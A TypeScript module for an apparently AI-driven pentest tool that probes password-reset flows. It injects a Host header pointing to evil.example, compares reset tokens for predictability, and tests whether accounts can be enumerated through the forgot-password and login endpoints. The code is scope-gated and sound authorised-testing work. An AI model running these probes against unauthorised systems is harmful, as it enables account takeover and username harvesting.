// accountRecovery.ts — password-reset / account-recovery ATO prover
// (write/confirm tool `account_recovery`). The highest-payout flow after OTP:
// nobody needs credentials when the recovery link is attackable. Three honest,
// baseline-controlled classes:
//
//   1. HOST-INJECTION — submit the recovery request with an attacker-chosen
//      Host / X-Forwarded-Host header and inspect the challenge response for a
//      full reset URL. A link pointing at the attacker host (or an absolute
//      URL whose host changed with OUR header) = the emailed link is
//      attacker-hosted → account takeover by clicking. (Delivery via email is
//      never claimed — the signal is the link shape in OUR response.)
//   2. TOKEN-ENTROPY — two fresh recovery responses are compared: when a
//      token-shaped value is extractable from both, repeated prefixes /
//      timestamps / tiny alphabets / identical tokens are flagged
//      (predictable = guessable = ATO). Nothing is submitted anywhere with a
//      guessed token.
//   3. ENUMERATION — differential response fingerprint between an existing
//      and a non-existing account across login / forgot / register: same
//      shape (status + body distance below threshold) = user-enum lead.
//
// Bounded ≤12 requests, politeDelay spacing, recordHttp on every request,
// session support, scope-gated via targetAllowed. Sinyal ≠ vuln: poc_verify
// before finding_add (CWE-640 / CWE-641 / CWE-204 / CWE-330).
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";
const BODY_BUDGET = 12_000;
const MAX_REQ = 12;

/** Attacker-host candidates injected via Host / X-Forwarded-Host. Pure. */
export const INJECT_HOSTS = [
  "evil.example",
  "attacker.evil.example",
] as const;

export type RecProbe = { status: number; body: string; ms: number; error?: string; headers?: Record<string, string> };

/** Extract reset-link-shaped absolute URLs from a response. Pure — tested. */
export function extractResetLinks(body: string): string[] {
  const out: string[] = [];
  const re = /https?:\/\/[A-Za-z0-9._~:/?#[\]@!$&'()*+,;=%-]{6,200}/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(body || ""))) {
    const u = m[0].replace(/[.,;'")\]]+$/, "");
    if (/(reset|recover|password|token|verify|activate|confirm)/i.test(u)) out.push(u);
  }
  return [...new Set(out)].slice(0, 6);
}

/** Host of a URL, or "" — pure. */
export function linkHost(link: string): string {
  try { return new URL(link).host.toLowerCase(); } catch { return ""; }
}

/**
 * Token-shape comparison between two recovery responses. Pure — tested.
 * Flags: identical tokens, repeated long prefixes, or a short/decimal alphabet.
 * A token must look tokenish (≥12 chars, mixed) before it is judged.
 */
export function tokenEntropyVerdict(
  a: string | null,
  b: string | null
): { tokenish: boolean; verdict: "identical" | "repeated-prefix" | "weak-alphabet" | "ok" | "none"; detail: string } {
  if (!a || !b) return { tokenish: false, verdict: "none", detail: "token tidak ditemukan di respons" };
  const tokenish = (t: string) => t.length >= 12 && /[A-Za-z]/.test(t) && /[0-9A-Fa-f]/.test(t);
  if (!tokenish(a) || !tokenish(b)) return { tokenish: false, verdict: "none", detail: "bentuk token tidak cukup panjang/karakter untuk dinilai" };
  if (a === b) return { tokenish: true, verdict: "identical", detail: "dua reset berturut-turut menghasilkan token IDENTIK — tidak ada random" };
  let common = 0;
  while (common < a.length && common < b.length && a[common] === b[common]) common++;
  if (common >= 10) return { tokenish: true, verdict: "repeated-prefix", detail: `prefix ${common} karakter identik antar token — timestamp/sequence, bukan random` };
  const alphabet = new Set((a + b).split(""));
  if (alphabet.size <= 12) return { tokenish: true, verdict: "weak-alphabet", detail: `alphabet cuma ${alphabet.size} karakter unik dari ${a.length + b.length} sampel — ruang pencarian kecil` };
  return { tokenish: true, verdict: "ok", detail: "token tampak acak (panjang + alphabet memadai)" };
}

/** Extract a tokenish value from a body. Pure — tested. */
export function extractToken(body: string): string | null {
  const m = /(?:token|code|key|reset)["'=:\s]+([A-Za-z0-9_-]{12,80})/.exec(body || "");
  return m ? m[1] : null;
}

/**
 * Enumeration verdict: same shape across two accounts. Pure — tested.
 * Same status AND small normalized body distance = indistinguishable.
 */
export function enumVerdict(a: RecProbe, b: RecProbe): { lead: boolean; detail: string } {
  if (a.error || b.error || a.status === 0 || b.status === 0) return { lead: false, detail: "network error — tidak dinilai" };
  const norm = (s: string) => (s || "").replace(/\s+/g, " ");
  const dist = Math.abs(norm(a.body).length - norm(b.body).length);
  if (a.status === b.status && dist <= 24) return { lead: true, detail: `respons existing vs non-existing IDENTIK (${a.status}, delta ${dist} byte) — username dapat dienumerasi` };
  return { lead: false, detail: `respons berbeda (${a.status} vs ${b.status}, delta ${dist} byte) — enum lewat endpoint ini sulit` };
}

async function send(
  url: string,
  method: "GET" | "POST",
  body: string | undefined,
  contentType: string | undefined,
  extraHeaders: Record<string, string> | undefined,
  session: string | undefined,
  rawUser: unknown
): Promise<RecProbe> {
  const headers: Record<string, string> = { "User-Agent": UA };
  if (session && rawUser) {
    const s = sessionHeaders(rawUser, session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  if (extraHeaders) Object.assign(headers, extraHeaders);
  if (body !== undefined) headers["content-type"] = contentType || "application/x-www-form-urlencoded";
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    const h: Record<string, string> = {};
    res.headers.forEach((v, k) => { h[k] = v; });
    return { status: res.status, body: (await res.text()).slice(0, BODY_BUDGET), ms: Date.now() - t0, headers: h };
  } catch (e) {
    return { status: 0, body: "", ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

function maskToken(t: string): string {
  return t.length <= 6 ? `${t.slice(0, 2)}••••` : `${t.slice(0, 4)}…${t.slice(-2)}`;
}

export type RecoveryOpts = {
  request_url?: string;   // forgot-password endpoint (POST account identifier)
  account?: string;       // identifier for the TARGET account (default owner@test.local)
  fake_account?: string;  // non-existing identifier (enumeration control; default nosuchuser.invalid)
  account_field?: string; // default "email"
  login_url?: string;     // optional login endpoint for the enumeration differential
  host_header?: string;   // attacker host to inject (default INJECT_HOSTS[0])
  placement?: string;     // form (default) | json
  session?: string;
};

/**
 * Password-recovery ATO prover. Bounded ≤12 requests, honest verdicts.
 */
export async function accountRecovery(rawUser: unknown, opts: RecoveryOpts = {}): Promise<string> {
  const reqUrl = String(opts.request_url || "").trim();
  if (!/^https?:\/\//i.test(reqUrl)) return "Error: request_url (forgot-password endpoint) harus http(s).";
  if (!targetAllowed(reqUrl)) return "Error: SCOPE — account_recovery hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let base: URL;
  try { base = new URL(reqUrl); } catch { return "Error: URL tidak valid."; }
  const loginUrl = String(opts.login_url || "").trim();
  if (loginUrl && !targetAllowed(loginUrl)) return "Error: SCOPE — login_url di luar izin.";
  const account = String(opts.account || "owner@test.local").trim();
  const fakeAccount = String(opts.fake_account || "nosuchuser.invalid").trim();
  const accountField = String(opts.account_field || "email").trim() || "email";
  const placement: "form" | "json" = String(opts.placement || "form") === "json" ? "json" : "form";
  const evilHost = String(opts.host_header || INJECT_HOSTS[0]).trim();
  const session = typeof opts.session === "string" && opts.session ? opts.session : undefined;
  const method: "GET" | "POST" = "POST";

  const build = (who: string): { body: string; contentType: string } => {
    if (placement === "json") return { body: JSON.stringify({ [accountField]: who }), contentType: "application/json" };
    return { body: new URLSearchParams({ [accountField]: who }).toString(), contentType: "application/x-www-form-urlencoded" };
  };

  let used = 0;
  const leads: string[] = [];
  const notes: string[] = [];
  const evilHeaders = (host: string): Record<string, string> => ({ host, "x-forwarded-host": host });

  // ---- 0) clean baseline recovery (no injection) ----
  await politeDelay();
  const clean = build(account);
  const baseRes = await send(reqUrl, method, clean.body, clean.contentType, undefined, session, rawUser);
  used++;
  recordHttp(rawUser, { method, url: reqUrl, status: baseRes.status, bytes: baseRes.body.length, ms: baseRes.ms, at: new Date().toISOString() });
  if (baseRes.error) return `Error: baseline gagal jaringan (${baseRes.error}) — target down / salah endpoint.`;

  const originHost = base.host.toLowerCase();

  // ---- 1) HOST-INJECTION: the injected Host must WIN over the request origin.
  // (A baseline "link host ≠ request origin" check is deliberately NOT a
  // signal: apps behind proxies legitimately compose links from their own
  // public domain while the prover talks to 127.0.0.1 / an internal name —
  // caught live in the verify block as a false positive.)
  const attackerHosts = new Set<string>([evilHost.toLowerCase(), ...INJECT_HOSTS.map((h) => h.toLowerCase())]);
  const baseLinks = extractResetLinks(baseRes.body);
  if (used < MAX_REQ) {
    await politeDelay();
    const inj = build(account);
    const injRes = await send(reqUrl, method, inj.body, inj.contentType, evilHeaders(evilHost), session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: reqUrl, status: injRes.status, bytes: injRes.body.length, ms: injRes.ms, at: new Date().toISOString() });
    const injLinks = extractResetLinks(injRes.body);
    const linkChanged = injLinks.some((l) => linkHost(l) === evilHost.toLowerCase());
    if (linkChanged) {
      const sample = injLinks.find((l) => linkHost(l) === evilHost.toLowerCase()) || "";
      leads.push(`HOST-INJECTION — reset link menyusut mengikuti Host kami (${evilHost}): ${maskToken(sample.slice(0, 46))}… → link email ber-host attacker = ATO by click.`);
    } else if (injLinks.length && baseLinks.length && linkHost(injLinks[0]) !== linkHost(baseLinks[0]) && !attackerHosts.has(linkHost(injLinks[0]))) {
      notes.push("host link berubah dengan header kami tapi tidak persis evil-host — indikasi komposisi dinamis, uji manual.");
    } else {
      notes.push(`host injection ${evilHost} tidak mengubah link di respons (host tetap ${linkHost(injLinks[0] || "") || originHost}).`);
    }
  }

  // ---- 2) TOKEN-ENTROPY: two fresh responses compared ----
  const t1 = extractToken(baseRes.body);
  let t2: string | null = null;
  if (used < MAX_REQ) {
    await politeDelay();
    const again = build(account);
    const againRes = await send(reqUrl, method, again.body, again.contentType, undefined, session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: reqUrl, status: againRes.status, bytes: againRes.body.length, ms: againRes.ms, at: new Date().toISOString() });
    t2 = extractToken(againRes.body);
    const ent = tokenEntropyVerdict(t1, t2);
    if (ent.tokenish && (ent.verdict === "identical" || ent.verdict === "repeated-prefix" || ent.verdict === "weak-alphabet")) {
      leads.push(`TOKEN-PREDICTABLE — ${ent.detail} (${maskToken(t1 || "")} vs ${maskToken(t2 || "")}).`);
    } else {
      notes.push(`entropy: ${ent.detail}.`);
    }
  }

  // ---- 3) ENUMERATION: existing vs non-existing, forgot + (optional) login ----
  if (used < MAX_REQ) {
    await politeDelay();
    const fake = build(fakeAccount);
    const fakeRes = await send(reqUrl, method, fake.body, fake.contentType, undefined, session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: reqUrl, status: fakeRes.status, bytes: fakeRes.body.length, ms: fakeRes.ms, at: new Date().toISOString() });
    const forgot = enumVerdict(baseRes, fakeRes);
    if (forgot.lead) {
      leads.push(`USER-ENUMERATION (forgot) — ${forgot.detail}.`);
    } else {
      notes.push(`forgot: ${forgot.detail}.`);
    }
  }
  if (loginUrl && used < MAX_REQ) {
    await politeDelay();
    const mkBody = (who: string) => placement === "json"
      ? { body: JSON.stringify({ [accountField]: who, password: "wrongpass123" }), contentType: "application/json" }
      : { body: new URLSearchParams({ [accountField]: who, password: "wrongpass123" }).toString(), contentType: "application/x-www-form-urlencoded" };
    const realTry = mkBody(account);
    const fakeTry = mkBody(fakeAccount);
    const r1 = await send(loginUrl, method, realTry.body, realTry.contentType, undefined, session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: loginUrl, status: r1.status, bytes: r1.body.length, ms: r1.ms, at: new Date().toISOString() });
    await politeDelay();
    const r2 = await send(loginUrl, method, fakeTry.body, fakeTry.contentType, undefined, session, rawUser);
    used++;
    recordHttp(rawUser, { method, url: loginUrl, status: r2.status, bytes: r2.body.length, ms: r2.ms, at: new Date().toISOString() });
    const login = enumVerdict(r1, r2);
    if (login.lead) leads.push(`USER-ENUMERATION (login) — ${login.detail}.`);
    else notes.push(`login: ${login.detail}.`);
  }

  const head = `♻️ ACCOUNT RECOVERY ${base.origin}${base.pathname} — ${used} request (budget ${MAX_REQ}), ${leads.length} LEAD.`;
  const lines = leads.map((l) => `• ${l}`);
  const tail = leads.length
    ? "⚠️ Sinyal → poc_verify (replay deterministik) sebelum finding_add (CWE-640/641/204/330). Email TIDAK pernah dikirim/dibaca oleh tool ini — klaim ATO butuh bukti klik/manual."
    : `Tidak ada kelemahan recovery yang terbukti dalam budget. ${notes.join(" ")} (Negatif ≠ aman.)`;
  return [head, ...lines, "", tail].join("\n");
}
